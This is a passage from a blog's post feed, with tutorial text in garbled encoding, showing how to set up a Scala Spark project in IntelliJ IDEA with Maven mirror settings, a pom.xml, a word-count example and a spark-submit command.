src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617891006508-8989d2c5-be7f-4b69-b629-04a0efe4381e.png#height=448&amp;id=HKPkV&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=896&amp;originWidth=1141&amp;originalType=binary%E2%88%B6=1&amp;size=47109&amp;status=done&amp;style=none&amp;width=570.5" alt="image.png"></p><h2 id="äºŒã€é…ç½®-Maven"><a href="#äºŒã€é…ç½®-Maven" class="headerlink" title="äºŒã€é…ç½® Maven"></a>äºŒã€é…ç½® Maven</h2><p>å³é”® pom.xml ï¼Œé€‰æ‹© Maven-&gt;æ‰“å¼€â€™settings.xmlâ€™<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617891096516-4f1b4d73-cc30-4d02-aadf-35b64fc92b96.png#height=658&amp;id=pjAN4&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1315&amp;originWidth=1610&amp;originalType=binary%E2%88%B6=1&amp;size=235544&amp;status=done&amp;style=none&amp;width=805" alt="image.png"><br>ä¿®æ”¹é…ç½®ä¸ºï¼š</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>settings</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/SETTINGS/1.0.0<span class="token punctuation">"</span></span>          <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>          <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/SETTINGS/1.0.0                      http://maven.apache.org/xsd/settings-1.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>localRepository</span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>interactiveMode</span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>usePluginRegistry</span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>offline</span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pluginGroups</span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servers</span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrors</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>aliyunmaven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">></span></span>central<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrorOf</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>é˜¿é‡Œäº‘å…¬å…±ä»“åº“<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>https://maven.aliyun.com/repository/central<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>repo1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">></span></span>central<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrorOf</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>central repo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>http://repo1.maven.org/maven2/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>aliyunmaven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">></span></span>apache snapshots<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrorOf</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>é˜¿é‡Œäº‘é˜¿å¸•å¥‡ä»“åº“<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>https://maven.aliyun.com/repository/apache-snapshots<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrors</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>proxies</span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activeProfiles</span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>profiles</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>profile</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>repositories</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>repository</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>aliyunmaven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>aliyunmaven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>https://maven.aliyun.com/repository/public<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>layout</span><span class="token punctuation">></span></span>default<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>layout</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>releases</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>enabled</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>enabled</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>releases</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>snapshots</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>enabled</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>enabled</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>snapshots</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>repository</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>repository</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>MavenCentral<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>http://repo1.maven.org/maven2/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>repository</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>repository</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>aliyunmavenApache<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>https://maven.aliyun.com/repository/apache-snapshots<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>repository</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>repositories</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>profile</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>profiles</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>settings</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ä¸‰ã€é…ç½®-pom-xml"><a href="#ä¸‰ã€é…ç½®-pom-xml" class="headerlink" title="ä¸‰ã€é…ç½® pom.xml"></a>ä¸‰ã€é…ç½® pom.xml</h2><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">></span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>Demo3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>maven.compiler.source</span><span class="token punctuation">></span></span>8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>maven.compiler.source</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>maven.compiler.target</span><span class="token punctuation">></span></span>8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>maven.compiler.target</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scala.version</span><span class="token punctuation">></span></span>2.12.10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scala.version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spark.version</span><span class="token punctuation">></span></span>3.1.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spark.version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!--scala--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.scala-lang<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>scala-library<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>${scala.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!--spark--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.spark<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spark-core_2.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>${spark.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!--hadoop--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.hadoop<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>hadoop-client<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.7.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å³é”® pom.xmlï¼Œé€‰æ‹© Maven -&gt; é‡æ–°åŠ è½½é¡¹ç›®<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617891322052-31e5364f-eff9-4789-9fb6-4846d01f5509.png#height=630&amp;id=v7flg&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1260&amp;originWidth=1711&amp;originalType=binary%E2%88%B6=1&amp;size=253795&amp;status=done&amp;style=none&amp;width=855.5" alt="image.png"></p><h2 id="å››ã€ç¼–å†™-Spark-ç¨‹åº"><a href="#å››ã€ç¼–å†™-Spark-ç¨‹åº" class="headerlink" title="å››ã€ç¼–å†™ Spark ç¨‹åº"></a>å››ã€ç¼–å†™ Spark ç¨‹åº</h2><ol><li>åœ¨ main åŒ…ä¸‹æ–°å»º scala ç›®å½•ï¼Œå¹¶è°ƒæ•´ä¸º suorces root</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617891626321-cac1f8a6-b516-4d0e-b133-6efc720bd172.png#height=527&amp;id=Lwab2&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1053&amp;originWidth=1781&amp;originalType=binary%E2%88%B6=1&amp;size=207611&amp;status=done&amp;style=none&amp;width=890.5" alt="image.png"></p><ol start="2"><li>åœ¨ test åŒ…ä¸‹æ–°å»º scala ç›®å½•ï¼Œå¹¶è°ƒæ•´ä¸º test suorces root</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617891761794-7a10e6d4-6426-48af-8722-581c004ed614.png#height=615&amp;id=foLE3&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1229&amp;originWidth=1753&amp;originalType=binary%E2%88%B6=1&amp;size=220334&amp;status=done&amp;style=none&amp;width=876.5" alt="image.png"></p><ol start="3"><li>ä¸ºé¡¹ç›®æ·»åŠ  scala æ”¯æŒ</li></ol><p>å³é”®é¡¹ç›®åç§°ï¼Œé€‰æ‹©-&gt;æ·»åŠ æ¡†æ¶æ”¯æŒ<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617892276004-83906431-b318-4135-b141-f44015503dd2.png#height=519&amp;id=rz19M&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1038&amp;originWidth=1613&amp;originalType=binary%E2%88%B6=1&amp;size=136596&amp;status=done&amp;style=none&amp;width=806.5" alt="image.png"></p><ol start="4"><li>åœ¨ main/scala ä¸‹æ·»åŠ è½¯ä»¶åŒ…ï¼Œç„¶ååˆ›å»º Scala ç±»-&gt;Object</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617892415368-fa48e8be-6e41-4116-9cc0-a9419c34a860.png#height=548&amp;id=vofCG&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1095&amp;originWidth=1550&amp;originalType=binary%E2%88%B6=1&amp;size=181839&amp;status=done&amp;style=none&amp;width=775" alt="image.png"></p><ol start="5"><li>è¯é¢‘ç»Ÿè®¡ Demo</li></ol><pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">package</span> org<span class="token punctuation">.</span>simple<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>spark<span class="token punctuation">.</span><span class="token punctuation">{</span>SparkContext<span class="token punctuation">,</span> SparkConf<span class="token punctuation">}</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span><span class="token punctuation">{</span>Level<span class="token punctuation">,</span> Logger<span class="token punctuation">}</span><span class="token keyword">object</span> Demo <span class="token punctuation">{</span>  <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Unit</span> <span class="token operator">=</span> <span class="token punctuation">{</span>    Logger<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">"org"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>Level<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span>    <span class="token keyword">val</span> sparkConf <span class="token operator">=</span> <span class="token keyword">new</span> SparkConf<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setAppName<span class="token punctuation">(</span><span class="token string">"WordCount"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setMaster<span class="token punctuation">(</span><span class="token string">"local"</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> sc <span class="token operator">=</span> <span class="token keyword">new</span> SparkContext<span class="token punctuation">(</span>sparkConf<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// è¯é¢‘ç»Ÿè®¡</span>    <span class="token keyword">val</span> dataRDD <span class="token operator">=</span> sc<span class="token punctuation">.</span>textFile<span class="token punctuation">(</span><span class="token string">"D:\\SparkProject\\data\\test.txt"</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span>flatMap<span class="token punctuation">(</span>_<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span>map<span class="token punctuation">(</span>x <span class="token keyword">=></span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span>reduceByKey<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token keyword">=></span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span>    dataRDD<span class="token punctuation">.</span>foreach<span class="token punctuation">(</span>println<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="äº”ã€è¿è¡Œç¨‹åº"><a href="#äº”ã€è¿è¡Œç¨‹åº" class="headerlink" title="äº”ã€è¿è¡Œç¨‹åº"></a>äº”ã€è¿è¡Œç¨‹åº</h2><ol><li>ç›´æ¥è¿è¡Œ</li></ol><p>å³é”®ç›´æ¥è¿è¡Œ<br>â€‹</p><ol start="2"><li>æ‰“åŒ…è¿è¡Œ</li></ol><p>é€‰æ‹©æ–‡ä»¶-&gt;é¡¹ç›®ç»“æ„<br>&nbsp; &nbsp;&nbsp;<img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617895595499-b8cf957f-5899-4019-95fc-aa22255fcc5a.png#height=349&amp;id=bWRfR&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=697&amp;originWidth=997&amp;originalType=binary%E2%88%B6=1&amp;size=123284&amp;status=done&amp;style=none&amp;width=498.5" alt="image.png"><br>ç„¶åå¦‚å›¾æ‰€ç¤ºè¿›è¡Œå¦‚ä¸‹æ“ä½œ<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617895671454-2eb3dfa7-8755-4615-b4ad-d77fa6f6a9a8.png#height=481&amp;id=DQppZ&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=961&amp;originWidth=1254&amp;originalType=binary%E2%88%B6=1&amp;size=80054&amp;status=done&amp;style=none&amp;width=627" alt="image.png"><br>é€‰æ‹©ä¸»ç±»<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617895751020-befd14c8-3222-4d35-aaed-b3f115598983.png#height=319&amp;id=EVNax&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=638&amp;originWidth=821&amp;originalType=binary%E2%88%B6=1&amp;size=34746&amp;status=done&amp;style=none&amp;width=410.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617895828390-6db7b24c-28fa-48bc-894f-9fc879cfc755.png#height=243&amp;id=ZC1dR&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=486&amp;originWidth=619&amp;originalType=binary%E2%88%B6=1&amp;size=32882&amp;status=done&amp;style=none&amp;width=309.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617895882712-fe4bccfb-b3bb-495f-93e9-90d946fedfef.png#height=481&amp;id=b6Kcw&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=961&amp;originWidth=1254&amp;originalType=binary%E2%88%B6=1&amp;size=153115&amp;status=done&amp;style=none&amp;width=627" alt="image.png"><br>ç§»é™¤ä¸éœ€è¦çš„ä¾èµ–åŒ…ï¼Œåªä¿ç•™æœ€åä¸€ä¸ª<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617895940937-6688d579-df09-4e33-ba12-8d5926a9b898.png#height=481&amp;id=hRQe2&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=961&amp;originWidth=1254&amp;originalType=binary%E2%88%B6=1&amp;size=158637&amp;status=done&amp;style=none&amp;width=627" alt="image.png"><br>æ„å»º<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617896003032-0b339a89-7af0-4fef-a24b-796395aaf515.png#height=217&amp;id=ntpEp&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=434&amp;originWidth=885&amp;originalType=binary%E2%88%B6=1&amp;size=77523&amp;status=done&amp;style=none&amp;width=442.5" alt="image.png"><br>ä¸Šä¼ åˆ° spark é›†ç¾¤åè¿è¡Œ</p><pre class="line-numbers language-bash"><code class="language-bash">spark-submit --class org.simple.Demo --master spark://spark0:7077 ./SparkDemo.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spark </tag>
            
            <tag> Maven </tag>
            
            <tag> å¼€å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEAå¼€å‘Sparkåº”ç”¨(Scala)</title>
      <link href="/post/51629339.html"/>
      <url>/post/51629339.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€ç¯å¢ƒå‡†å¤‡"><a href="#ä¸€ã€ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ä¸€ã€ç¯å¢ƒå‡†å¤‡"></a>ä¸€ã€ç¯å¢ƒå‡†å¤‡</h2><ol><li>Scala æ’ä»¶</li><li>JDK</li><li>Scala SDK</li><li>Spark</li></ol><h2 id="äºŒã€åˆ›å»ºé¡¹ç›®"><a href="#äºŒã€åˆ›å»ºé¡¹ç›®" class="headerlink" title="äºŒã€åˆ›å»ºé¡¹ç›®"></a>äºŒã€åˆ›å»ºé¡¹ç›®</h2><ol><li>ç‚¹å‡»æ–°å»ºé¡¹ç›®</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617110846305-bd65ead5-6b7a-4afb-a1c8-57b113605db0.png#height=410&amp;id=likg6&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=606&amp;originWidth=891&amp;originalType=binary%E2%88%B6=1&amp;size=47860&amp;status=done&amp;style=none&amp;width=603" alt="image.png"></p><ol start="2"><li>é€‰æ‹©æ–°å»º Scala é¡¹ç›®</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1617110975933-60c59d30-1209-4df0-a993-b9980165f366.png#height=568&amp;id=sU9k3&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=755&amp;originWidth=802&amp;originalType=binary%E2%88%B6=1&amp;size=78018&amp;status=done&amp;style=none&amp;width=603" alt="image.png"></p><ol start="3"><li>å¡«å†™ç›¸åº”çš„ä¿¡æ¯</li></ol><p><img 